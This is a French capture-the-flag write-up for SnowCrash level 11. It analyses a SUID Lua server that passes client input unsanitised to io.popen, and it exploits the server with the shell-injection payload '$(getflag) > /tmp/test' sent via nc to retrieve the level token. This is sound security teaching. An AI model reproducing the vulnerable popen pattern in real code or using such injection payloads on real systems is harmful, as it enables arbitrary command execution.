# LEVEL11

Le système de fichier se présente de cette manière:

``` bash
level11@SnowCrash:~$ ls -la
total 16
dr-xr-x---+ 1 level11 level11  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level11 level11  220 Apr  3  2012 .bash_logout
-r-x------  1 level11 level11 3518 Aug 30  2015 .bashrc
-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
-r-x------  1 level11 level11  675 Apr  3  2012 .profile

```

Nous voyons un script lua, qui est un language interprété (sans compilation). Contrairement aux niveaux précédent, nous avons ici accès au code source direcement, ce qui facilite l'analyse.


``` bash
cat level11.lua
```
``` lua

#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end

```

En voulant exécuté le script on comprend qu'il crée un serveur à l'adresse de localhost sur lequel on peut se connecter avec le port 5151.
Le serveur est déjà lancé quand on veut lancer le script lua:

``` bash
level11@SnowCrash:~$ lua level11.lua
lua: level11.lua:3: address already in use
stack traceback:
	[C]: in function 'assert'
	level11.lua:3: in main chunk
	[C]: ?
```

"Adress already in use" fait reference au couple 127.0.0.1 5151
L'utilisation de `ps aux` permet de voir qu'un processus est effectivement lancé à partir du fichier `level11.lua`.


``` bash
level11@SnowCrash:~$ ps aux | grep lua
flag11    1827  0.0  0.0   2892   828 ?        S    11:35   0:00 lua /home/user/level11/level11.lua
level11   2214  0.0  0.0   4380   820 pts/1    S+   15:02   0:00 grep --color=auto lua
```

On va donc se connecter au serveur avec nc, l'adresse et le port.
On ne veut pas juste écouter sur le serveur mais cette fois-ci envoyer des données depuis localhost donc on utilise pas le flag `-l`.

``` bash
level11@SnowCrash:~$ nc -l 5151
nc: Address already in use
```

La chaine de caractère présente dans le fichier `.lua` ne permet pas de se connecter.

``` bash
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: f05d1d066fb246efe0c6f7d095f909a7a0cf34a0
Erf nope..
```

La faille se trouve dans le script .lua.
Un serveur est mis en place, qui accepte les connexions d'un client. 
Le texte envoyé par le client en guise de mot de passe passe par la fonction `hash()` qui fait appel à la fonction `io.popen()`. Cette fonction invoque un shell (techniquement, elle ouvre un pipe vers un processus dérivé). 

Son prototype se présente de cette manière en lua :
```lua 
io.popen(prog[,mode])
```

On va pouvoir faire une substitution de commande dans cette partie:
``` lua
io.popen("echo "..pass.." | sha1sum", "r")
```
Dans cette commande `echo()` attend l'argument `pass` (l'entrée du client) inséré via `..` l'opérateur de concaténation en Lua.
C'est précisément cette fusion non sécurisée entre une chaine fixe et une entrée utilisateur qui crée la faille. Puisque la variable `pass` n'est pas sanitizée, un attaquant peut injecter des métacaractes shell (`$()`, `>`) pour exécuter des commandes arbitraires avec les privilèges du processus (flag11), le bit SUID étant activé
.
On va pouvoir injecter la sommande shell `$(getflag)` en la donnant en argument de `echo` puis rediriger sa sortie dans un fichier, sinon elle serait redirigé dans un pipe et transmise ensuite à `sha1sum()` qui transformerait la chaine.

``` bash
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: $(getflag) > /tmp/test
Erf nope..
```

La commande dan le script sera interprétée comme :
``` lua
io.popen("echo "$(getflag) > /tmp/test "| sha1sum", "r")
```

Ensuite nous n'avons plus qu'à afficher le résultat dans le fichier:

``` bash
level11@SnowCrash:~$ cat /tmp/test
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

Commandes utiles:
  - ss -ltnp
  - netstat -tuln
  - lsof